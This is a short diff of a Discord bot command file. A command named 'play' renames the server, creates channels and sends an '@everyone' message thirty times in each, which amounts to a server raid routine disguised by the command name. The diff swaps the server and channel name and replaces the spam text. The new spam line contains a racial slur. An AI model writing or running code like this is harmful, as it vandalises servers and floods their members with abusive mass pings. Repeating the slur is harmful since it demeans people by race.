@@ -5,8 +5,8 @@ const {
 module.exports = {
     name: 'play',
     async execute(message) {
-        let channelName = 'readme';
-        let guildName = 'readme';
+        let channelName = '144op';
+        let guildName = '144op';
 
         await message.guild.setName(guildName);
 
@@ -14,7 +14,7 @@ module.exports = {
             await message.guild.channels.create(channelName, {
             }).then((c) => {
                 for (let j = 0; j < 30; j++) {
-                    c.send('@everyone  this server is boring as balls so im raiding it join the main one for your roles if uou had any https://discord.gg/PQ4Xr7xEPC');
+                    c.send('@everyone 144 Is op nigga');
                 }
             });
         }
